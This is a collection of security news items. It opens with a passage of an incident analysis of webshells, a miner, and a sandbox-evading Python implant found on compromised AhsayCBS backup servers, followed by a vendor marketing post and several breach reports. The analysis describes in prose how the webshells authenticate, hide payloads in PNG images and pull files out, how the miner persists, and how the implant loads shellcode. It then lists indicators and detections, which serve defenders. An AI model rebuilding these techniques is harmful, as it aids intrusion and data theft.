The third family looked completely different, and included files named status_ followed by six random letters. These shells used auth, cmd, del, and rm parameters: they were designed to run commands, recursively delete any path they are given, and delete themselves. To the latter point, defenders should keep in mind that the shell can delete itself after use, so not finding the file on disk does not prove it was never present.

A smaller variant of this family, named st_ followed by six random letters, drops the authentication and the delete function. It takes c with no authentication at all, plus a get=env parameter that prints the application home, the Catalina base, the operating system and the temp directory, and an rm=1 parameter that deletes the file.

Family

Parameters and behavior

Keyed command shell

p key (a wrong key returns 404), c command run through cmd.exe /c, output Base64-encoded. a and b return a sum, which works as a quick liveness check.

Keyed shell with file write

Same as above, plus w (path) and d (Base64 data) to write a file.

AhsayCBS.jsp

The folder locations where we found these webshells gave us further insight into how the attack might vary across operating systems. The impacted servers here ran Windows: however, the exploit also attempted Linux-style installation paths, suggesting the exploit was not tailored to one operating system.

In addition to webapps\cbs and webapps\rps in the real install, we found copies in directories matching Linux-style paths, including /opt/AhsayCBS, /usr/local/AhsayCBS, and /home/ahsay/AhsayCBS. On one of the affected Windows servers, these appeared as folders under C:\opt, C:\usr, and C:\home, with a staging folder, C:\ahsay_tf, holding another copy. That suggests the exploit was not designed for a specific operating system or install path, and simply tried every likely location.

The copies outside the live install were not served by the web application, so they probably cannot be used as shells on Windows, but they are a reliable tell. Several shells also sat in random six-character folders, each containing its own app, conf, and webapps\cbs subfolders. These imitate the structure of an AhsayCBS install, but none of the components are part of the real application. Some of those folders held empty pb_ marker files in the conf folder, and folders named ahsay_poc_*, ahsay_tf, ahsay_th and ahsay_t0 showed up in Program Files.

Figure 2: Shell locations on a Windows host: the live install, and the Linux-style paths the exploit also tries

A webshell that hides inside an image

One of the webshell families, AhsayCBS.jsp (in webapps\rps), was disguised as an image-preview service: it was designed to extract encrypted code from uploaded PNGs and run it in memory while making its traffic resemble ordinary image requests.

The webshell's disguise as an internal image preview service even extended down to a comment block describing a watermark endpoint. The webshell used only JSP implicit objects and fully qualified class names, meaning it would compile on any servlet container and on Java Development Kit (JDK) 6 and later.

On the sample we saw, the webshell was designed to work as follows:

First, the operator POSTs a PNG.

Then the page reads the least-significant bit of each pixel's red, green and blue values, one pixel at a time.

It strings those bits together and packs them into bytes, with the first bit read becoming the most significant bit of each byte.

That rebuilds a four-byte big-endian length followed by that many bytes of payload, which it then decrypts with AES.

The key is hardcoded, and the cipher is Java's default AES transformation (translating to ECB mode with PKCS5 padding).

On the first request, the decrypted bytes are loaded as a Java class through a small custom ClassLoader and stored in the application context under the attribute name QuCh, and the page answers with its built-in cover image. On later requests, it creates an instance of that class, hands it the request, an output buffer and the decrypted data through calls to equals(), and calls toString() to run it. Whatever the class produces is encrypted again and written into a new PNG.

Passing arguments through equals() is a convention used by some open-source in-memory webshell frameworks, though we have not tied this one to a specific framework. The practical effect is that the functionality arrives per request and lives in memory. The access log showed what looked like image traffic, and there was no c or p parameter to search for. We analyzed the loader, not the class it receives, so we cannot confirm what the operator actually ran through it.

Figure 3: How AhsayCBS.jsp turns an uploaded image into running code

A webshell with a signed API

Not every shell was a one-liner. nsmind.jsp, also in webapps\rps, behaved like a small remote administration service.

In the sample we saw, every request must carry an X-Auth-Token header that matches a hardcoded API key, plus X-Timestamp, X-Nonce and an X-Signature header holding an HMAC-SHA256 of the request parameters. The timestamp has to be within five minutes of the server's clock, and each nonce is stored in the application context so a captured request cannot be replayed. A request that fails any check gets a short JSON error, so the page behaves like an ordinary API that rejects unauthenticated callers.

Behind the checks, the action parameter selects exec, cd, upload or download. exec runs the command through cmd.exe /c (after chcp 65001, so output comes back as UTF-8) and tracks the working directory between calls, so the operator gets a persistent shell. upload and download move files in chunks using an offset parameter, with a limit of 4 GB per file, which means a large file can be pulled off the server through many small requests.

On a server that holds backups, this download action is the part to worry about: it is a ready-made exfiltration channel that looks like normal API traffic. We did not see logs showing download in use, so we cannot say what, if anything, was taken.

The files also showed the operator iterating. In the same rps folder we found three timestamp-named folders, each holding a single copy of a shell. The oldest held the simple cmd, del and rm shell described above, and the two newer ones contained nsmind.jsp, which suggested the operator upgraded from a basic shell to this tool. We also found byte-identical copies of nsmind.jsp and AhsayCBS.jsp on two of the servers, which pointed to one operator or one script working across hosts.

A second miner, with its own persistence

The Edge-themed miner analyzed in our initial blog was not the only one: we also found another miner in our follow-up investigation.

The XMRig miner we observed (kvm-agent.exe) is configured like a standard XMRig build: donate level 0, MSR access enabled (the same capability the WinRing0 driver in the first post provides), and TLS connections on port 443 to SupportXMR pools. The wallet and password differed from the Kryptex pool and user listed in the first post, making us believe this was a separate miner and not a second copy of the first. We found the same file, with the same hash, on two servers, and the task on both was created the same night and edited within seconds of each other, which again points to one operator or one script working across hosts.

During our analysis, we found a scheduled task named kvm running as SYSTEM every minute. Its command used a tasklist to check whether kvm-agent.exe was running and, if it wasn't, it would start it from C:\Windows\SysWOW64\kvm-agent. This means that if the miner was killed, it would be back up and running within a minute. The task's start time was set well before the intrusion (making it look older than it was in task listings).

Figure 4: The kvm scheduled task (start time elided)

A Python implant that only runs where it was staged

The most interesting file we pulled was main.py, which sits in an embedded Python distribution under the SYSTEM profile and is started from a Run key through explorer.exe. The script is only a wrapper: Base64, then lzma, then a marshaled Python code object that it passes to exec. Decoding it without running it shows that the code was compiled from a file called heap_shellcode_runner_bound_weaponized.py.

The code computes the SHA-256 of the host's MachineGuid and looks for a file with that name next to main.py. Based on the bytecode, if the marker file is missing, the script exits. That would keep the implant from running in a sandbox or on an analyst's machine, because the marker only exists on the host it was provisioned for. We did not find a marker file in the folder we collected, so either it was not part of what we pulled or it was removed. If the marker is present, the script copies a 673 KB blob into an executable heap (HeapCreate, HeapAlloc, RtlMoveMemory) and starts it on a new thread with CreateThread.

Figure 5: The implant's execution flow, reconstructed from static analysis

Figure 6: The decoded logic, reconstructed from the code object

The blob starts with a short bootstrap that calls a reflective loader at the end of the blob, which in turn maps an x64 DLL carried inside it. The DLL is C++ with a JSON library and imports very little: bcrypt, KERNEL32, OLEAUT32 and SHLWAPI, with the networking functions resolved at run time. It has no export table, no PDB path and no version resource, so the usual attribution breadcrumbs have been stripped.

Its strings include the C2 URL hxxps://creepexplosiondarknight[.]com/d, a JSON content type, a mutex, and string fragments (dns.quad with 9.net, and dns.goog) consistent with DNS-over-HTTPS lookups through Quad9 and Google. It also reads MachineGuid and Windows version information, which fits host identification. We have not identified the malware family and have not watched the implant run, so what it does after it checks in is still an open question.

Figure 7: Selected strings from the embedded DLL (C2 defanged)

The rest of the toolkit

Around those pieces, the same environment held the tunneling tools gost and chisel, staged in .st<id> folders as wust<id>a.exe and wust<id>b.exe, the remote access tools AnyDesk, Atera and Splashtop, a local account named wdguest, and a Mimikatz package on disk. We also saw Microsoft Defender exclusions that covered C:\ProgramData, C:\Windows, temp folders, the dropper processes, and the AhsayCBS service process (cbssvcX64.exe). These exclusions would have reduced Defender's ability to scan files in those locations and files accessed by the excluded processes, creating broad blind spots for the operator's tooling.

Backup servers as a target

Everything above ran on servers whose purpose is to hold or manage backups. On a related Veeam server in the same environment, we also saw a command consistent with NetExec's Veeam credential-theft module: a PowerShell script, apparently launched remotely through WMI, that queried the VeeamBackup PostgreSQL database for stored credentials and decrypted them with DPAPI. Backup software holds credentials for hypervisors, repositories and domain accounts. We cannot say how many of those credentials were retrieved, but the pairing of an Ahsay foothold with a Veeam credential query suggested the operator was interested in backup infrastructure on purpose, not by accident.

What to check for

Patching closes the entry point. It does not clean up what already happened, so on any server that was exposed before the hotfix, look for:

Unexpected .jsp files under webapps\cbs and webapps\rps, especially random names and the status_ and st_ patterns, and requests to UpdateReceivers.do in the AhsayCBS access logs

Folders named ahsay_*, home, opt, srv or usr at the root of the drive or in Program Files, and timestamp-named folders (year-month-day-hour-minute-second) next to the shells, which in some cases held a single copy of one

Scheduled tasks and services you did not create, including a SYSTEM task with a one-minute repeat that tests for a process with tasklist

Defender exclusions you did not add, especially for C:\ProgramData, C:\Windows and the AhsayCBS service process

An embedded Python install under the SYSTEM profile and a Run key that launches it

A few behaviors make useful detections even when the files are gone:

python.exe or pythonw.exe running from a path under the SYSTEM profile

Outbound requests to public DNS-over-HTTPS resolvers from a process that is not a browser

New .jsp files created under the AhsayCBS web directories

The parent-child pattern our earlier Sigma rule already looks for, where cbssvcX64.exe spawns a command shell.

If you find any of the above, we recommend a full re-image from a trusted backup and rotating credentials stored on or reachable from the server, including those saved in AhsayCBS and in any backup software on the same network.

Full Text:
Why the Risk Operations Center Is Becoming the System of Record for Proactive Enterprise Risk Reduction

The cybersecurity industry has spent years improving how we discover vulnerabilities. The challenge now is no longer finding risk. It is reducing risk faster than adversaries can exploit it.

The PHP2Shell vulnerabilities disclosed in October are a reminder of how quickly exposure can become exploitation. Within hours of disclosure, attack activity was already being observed. Across more than 10,000 customer environments, the Qualys Threat Research Unit identified more than 166 million PHP installations, approximately three-quarters of them internet-facing. Yet only a small percentage were patched during the critical first hours after disclosure.

This trend is only accelerating. Frontier AI is reducing the time and effort required for reconnaissance, vulnerability analysis, attack planning, and exploitation. The gap between disclosure and weaponization continues to compress, placing increasing pressure on defenders to prioritize and remediate risk at machine speed.

At the same time, the enterprise attack surface has fundamentally changed.

Risk is no longer concentrated in servers, laptops, and cloud workloads. It now extends into mobile devices, medical technology, healthcare environments, manufacturing operations, operational technology, connected devices, and other cyber-physical systems. Many of these assets support an organization’s most critical functions. They help deliver patient care, keep production lines running, support transportation networks, and operate critical infrastructure. Mobile devices have become equally important, providing access to corporate data, business applications, sensitive communications, and some of an organization’s most valuable information.

Yet these environments are often managed separately, with different teams, tools, workflows, and severity models. Attackers do not see those boundaries. They see a single attack surface.

That is why the Risk Operations Center matters.

The Risk Operations Center was never intended to be another dashboard, nor was it intended to replace the SOC. It is an operating model for continuously identifying, prioritizing, validating, and reducing risk across the enterprise before those vulnerabilities can ever be exploited. To fulfill that mission, the ROC must extend beyond traditional IT assets.

As attack surfaces expand and threats accelerate, organizations need more than visibility. They need a way to bring together technology, telemetry, and expertise into a single operating model capable of operationalizing cyber risk management at scale.

That is the vision behind the expanded Global mROC Alliance.

By bringing together the Qualys platform, specialized technology alliance partners, and a global ecosystem of highly trained Risk Operations Center experts, the Global mROC Alliance helps organizations move from identifying risk to systematically reducing it across the enterprise. The goal is not simply to see more risk. It is to help customers outpace increasingly sophisticated threats in the age of AI.

As part of that effort, Qualys Enterprise TruRisk Management (ETM) now integrates telemetry from Lookout and NowSecure for mobile security, and from Claroty and Nozomi Networks for OT, IoT, healthcare, and cyber-physical environments.

This expands visibility into some of the least measured yet most consequential areas of enterprise risk.

More importantly, it creates a common operational model for reducing risk. Qualys ETM and TruRisk provide the visibility to understand exposure, the prioritization to focus on what matters most, and the remediation guidance needed to drive measurable risk reduction across the attack surface.

The objective is not simply broader visibility. The objective is better prioritization and faster risk reduction.

When a vulnerable mobile device, an exposed medical system, an industrial controller, and an internet-facing application are all evaluated through the same framework, security teams can focus on reducing the risks that have the greatest potential impact on the business rather than simply responding to the loudest alerts.

For mobile environments, that means bringing device posture, application risk, operating system vulnerabilities, and threat telemetry into the same risk conversation as cloud, endpoint, and infrastructure exposure. A compromised mobile device with privileged access may represent greater business risk than dozens of lower-priority infrastructure findings.

For healthcare, manufacturing, OT, and cyber-physical environments, it means incorporating risks that have traditionally existed outside mainstream security operations. Through Claroty and Nozomi Networks, organizations gain visibility into environments where operational continuity is paramount and active scanning may not be feasible. Just as importantly, those risks can now be prioritized and managed through the same remediation workflow as the rest of the enterprise. Where patching is not possible, compensating controls such as segmentation and access restrictions become part of the same risk reduction process.

This is the power of Qualys’ Global mROC Alliance.

Technology alliance partners contribute deep visibility into the environments they know best. Qualys ETM and TruRisk transform that telemetry into a common risk language through visibility, prioritization, and remediation. mROC Alliance partners help customers operationalize those insights through advisory services, implementation, managed risk reduction programs, and fully managed Risk Operations Center services.

Together, they provide organizations with a practical path to reducing risk across the entire attack surface, not just the portion that has historically been easiest to measure.

Find out more about the Global mROC Alliance.

Learn More

PHP2Shell is not the story.

PHP2Shell was just the opening act. The real story is that the time between vulnerability disclosure and exploitation continues to shrink while the attack surface continues to expand.

Organizations can no longer afford separate programs for IT, mobile, healthcare, OT, IoT, and cyber-physical risk. They need a common operating model, a common language for prioritization, and a single system for driving remediation.

The organizations that succeed will not be those that discover the most vulnerabilities. They will be those that reduce the most risk in the shortest amount of time.

That is the purpose of the Risk Operations Center.

And that is why the Risk Operations Center is emerging as the operating system for proactive cyber risk reduction in the age of AI.

Full Text:
Sega has revealed that around 2.2 million customer email addresses have been exposed as result of a third-party incident.

The video gaming giant revealed on November 9 that an unauthorized third party leaked the email addresses after gaining access to Arara Inc., a Japanese email delivery provider used by Sega to distribute its email newsletter.

“We deeply apologize for the great inconvenience and concern caused to our customers and all parties involved,” Sega wrote.

“Currently, Arara is working to identify the causes of unauthorized access and prevent further damage, and we are working with Arara and related companies to confirm the details of the leaked information.”

The Japanese firm said the breach is limited to 2.196 million email addresses for various email newsletters, and 92,273 items related to distribution.

The leaked information does not include customer names, dates of birth, genders, addresses, phone numbers, credit card information or login passwords.

No misuse of the leaked data has been currently confirmed. However, Sega has warned customers to be vigilant for suspicious emails purporting to be from Sega or Sega Fave Corporation, or using product or service names operated by both companies.

Sega Fave is a subsidiary of the broader Sega group, which focuses on the production of toys and arcade machines.

“Please do not open or reply to URLs or attachments provided in emails you do not recognize. Accessing URLs or opening attached files may lead to entering personal information or affecting your device. Neither our company nor Sega Fave will ask you for your password or credit card information by email. If you receive such an email, do not access the reply or the provided link; delete it,” the company said.

Sega Breach Part of Large-Scale Third-Party Incident

Arara revealed it had been compromised in a statement issued on October 29, which said that unauthorized access was gained to certain server systems of its email distribution service a day earlier, on October 28 after a hacker exploited vulnerabilities in web servers.

The distribution service ‘Arara Message’ was suspended on October 31 and remains offline at the time of writing, according to a dedicated incident page set up by the firm to provide updates.

According to a report by The Japan Times, Arara’s parent company Paycloud Holdings confirmed on November 2 that hackers gained unauthorized access to servers operated by the subsidiary, which exposed information held by around 380 corporate clients using the service. This included 77 million email addresses.

Paycloud also noted that depending on the company, the breached data also included names, telephone numbers and addresses. However, it said that no credit card details have been exposed.

Title: 13.3 million people’s medical data exposed; companies pay $300,000
Context: The result: the companies only discovered the attack when the attackers contacted them on May 2, 2023, and demanded payment
Full Text:
The New York attorney general (AG) has reached a settlement over a medical data breach that affected 13.3 million people after basic security failures.

Perry Johnson & Associates (PJ&A) and four related companies have agreed to pay $300,000 and implement extensive security reforms following a breach that exposed personal and medical information belonging to more than 13.3 million people. They face another $9.7 million in penalties if they fail to meet the settlement’s terms.

New York AG Letitia James announced the agreement on November 6, alongside the attorneys general of Connecticut, Michigan, and New Jersey. Approximately 4.2 million of the people affected were New York residents.

The investigation describes a series of failures: remote access without multifactor authentication, nearly identical passwords circulated by email, sensitive files without file-level encryption, and security software that detected malicious activity but did not alert security staff.

The result: the companies only discovered the attack when the attackers contacted them on May 2, 2023, and demanded payment.

How many people were affected?

The stolen database files contained records associated with more than 13.3 million people, including approximately 4.2 million New Yorkers.

Earlier reporting put the number of affected patients at approximately 8.95 million. The settlement documents now give the larger figure of more than 13.3 million. The total could be higher, since the AG found that attackers also accessed files in shared network storage containing personal and health information, but the companies did not review those files to identify additional affected people.

The information included:

Names, dates of birth, and home addresses.

Social Security numbers.

Medical record and hospital account numbers.

Insurance information.

Admission diagnoses and dates of treatment.

Clinical information from medical transcriptions, including test results, medications, treatment facilities, and healthcare providers.

See if your personal data has been exposed.

SCAN NOW

Notifications were also slow. PJ&A began contacting clients about the stolen database files in July 2023, and its clients notified affected individuals between October 31, 2023, and February 8, 2024. The New York AG found that the companies violated state requirements to disclose a breach as quickly as possible and without unreasonable delay.

The settlement

Although the announcement describes a settlement worth up to $10 million, the companies must pay $300,000 in penalties to the states. The remaining $9.7 million is suspended and could become payable. New York will receive $100,000 from the initial payment. These are payments to the states, not an announced compensation payout to patients.

The exposed information could be valuable to criminals. Our research found stolen identity packages selling for as little as 95 cents apiece on the dark web.

The settlement also requires extensive security changes for the relevant active companies, including:

MFA for individual user accounts, including administrator accounts, and remote network access.

Stronger password management and access restricted to what employees need for their jobs.

Encryption of personal and protected health information.

Monitoring that automatically alerts security personnel to suspicious activity.

Annual risk assessments and penetration testing.

Network segmentation and measures to detect and prevent unauthorized data transfers.

Written incident response procedures and clearer rules for retaining and securely disposing of sensitive information.

Given the carelessness, number of exposed records and people, do you think the companies got off cheap? Let us know in the comments.

How to stay safe

A breach does not automatically mean someone has misused your information, but you can take these precautions while you wait for more details:

Verify unexpected messages independently. Don’t let a message about the breach rush you into clicking a link, sharing sensitive information, or making a payment. Go to your healthcare provider or insurer’s official website yourself or use contact details you already trust.

Review medical bills and insurance statements. Look for appointments, tests, prescriptions, or services you did not receive. The Federal Trade Commission (FTC) identifies unfamiliar medical bills and unexpected items on an Explanation of Benefits statement, which explains how your insurer processed a claim, as warning signs of medical identity theft. Report discrepancies to your healthcare provider and your insurer.

Review your credit reports. Look for unfamiliar accounts or debts and dispute errors. Free reports are available through AnnualCreditReport.com.

Act if you find signs of identity theft. Visit IdentityTheft.gov for a recovery plan. If someone has received care in your name, ask the providers involved for copies of your medical records and request corrections in writing.

Medical identity theft is not just a financial problem; it can also affect your care. Someone using your identity to obtain treatment or submit insurance claims could introduce incorrect information into your health records. Checking medical statements and reporting anything unfamiliar can help you catch that misuse.

Title: Japanese homeware giant pulls online store after cloud breach puts 7.7M records at risk
Context: Japanese electronics giant Iris Ohyama has taken down its online store after discovering that attackers may have accessed the personal information of 7
Full Text: Japanese electronics giant Iris Ohyama has taken down its online store after discovering that attackers may have accessed the personal information of 7.7 million customers, leaving shoppers unable to place orders. The retailer, which sells everything from home appliances and furniture to pet supplies, first disclosed the incident on October 29, a day after discovering a suspicious file on a third-party cloud service used by its Iris Plaza ecommerce operation. Iris Plaza immediately suspended its website and associated systems and began investigating, subsequently confirming unauthorized access. Iris Ohyama has since revealed that the potentially compromised cloud environment contained personal information belonging to approximately 5.8 million registered customers, including former members, and another 1.9 million people who had purchased products without creating an account or participated in promotional campaigns. The potentially exposed information includes names, addresses, phone numbers, email addresses, dates of birth, gender, and passwords, although the company says the exact information at risk varies between customers. Some of that data, including passwords, was encrypted, but Iris Ohyama hasn't explained what protection was used. It has advised customers who reused their Iris Plaza passwords elsewhere to change them, presumably before someone else gets the opportunity. There is some good news for anyone who has handed over their credit card details, as the retailer says it didn't store payment information in the affected cloud service and that it hasn't been compromised. It remains unclear whether the attackers actually made off with any personal information. In its FAQ, Iris Plaza says it is still investigating the possibility of a data leak and has yet to establish the full extent of the intrusion. Meanwhile, Iris Plaza's website is still down, and the company isn't saying when it'll be back. Orders are also taking longer to ship, while customers trying to cancel a purchase have been told they may have to turn the delivery driver away if their parcel arrives before the cancellation is processed. Fortunately for anyone desperate to buy a new rice cooker, Iris Plaza's stores on Rakuten, Yahoo! Shopping, and auPAY Market are still operating. The company says it has found no evidence that those stores were affected. Iris Ohyama has reported the incident to Japanese authorities and says it will contact potentially affected customers individually. It has also warned shoppers to watch out for phishing emails, fraudulent calls, and fake websites impersonating the retailer. The company has yet to identify the cloud provider involved, explain how the attackers got in, or establish whether any of those 7.7 million records actually left its systems. ®

Full Text:
A leading French banking group has moved to reassure customers that their funds are safe after reports emerged of a $133m heist.

Crédit Mutuel Arkéa issued a statement on November 4 confirming that it had been a victim “of an attack that enabled fraudulent transactions to be carried out.”

The hackers reached the bank’s network via the platform of a service provider, it added in an FAQ on the incident.

“The attackers used Crédit Mutuel Arkéa's own account to make transactions to other banking institutions, which then potentially allowed them to convert this money into cryptocurrency via specialized platforms,” it said.

“They did not, therefore, use customer accounts belonging to its federations or subsidiaries. We have communicated that this incident has no financial consequences for our customers. As soon as this attack was identified, our teams immediately activated the necessary security measures to contain the incident and prevent any further fraudulent activity against us.”

Read more on big-money heists: Brazilian Fintech Giant Sinqia Reveals $130m Heist Attempt

Suspicious Withdrawals Traced Across Multiple Exchanges

The incident first came to light on November 2 when blockchain investigator, “ZachXBT,” claimed in a Telegram post that an unnamed “EU entity” had lost $106m from “multiple centralized exchange accounts.”

ZachXBT ruled out the involvement of notorious North Korean hackers the Lazarus Group.

“Over the past 24 hours the illicit actor has been aggressively swapping USDC for ETH, transferring to instant exchanges (WellWallet, Kyrrex, etc), converting to XMR via Wagyu, and bridging across multiple chains,” they explained.

The investigator posted an updated the day after claiming to have spotted an additional $27m of fraudulent centralized exchange account (CEX) withdrawals.

“My working theory is a large financial institution in Western Europe was exploited and it’s currently being covered up,” they said. “No proper incident disclosure has resulted in $30m+ being laundered away which could have been frozen by EU law enforcement.”

However, Crédit Mutuel Arkéa noted in its FAQ that it was “still too early” to say for sure how much was taken.

“Our teams are continuing their work to precisely assess the financial consequences of this attack: some of the funds involved have been frozen, and other actions are underway to recover them,” it said.

“We can already confirm that the amounts involved are in no way likely to jeopardize the financial health and stability of Crédit Mutuel Arkéa.”

The bank urged customers to be on the lookout for potential phishing attempts in the aftermath of the incident and resulting publicity.

The news comes just days after North Korean hackers stole an estimated $6.3bn from cryptocurrency exchange Binance, in what has been described as the biggest theft of its kind ever seen.
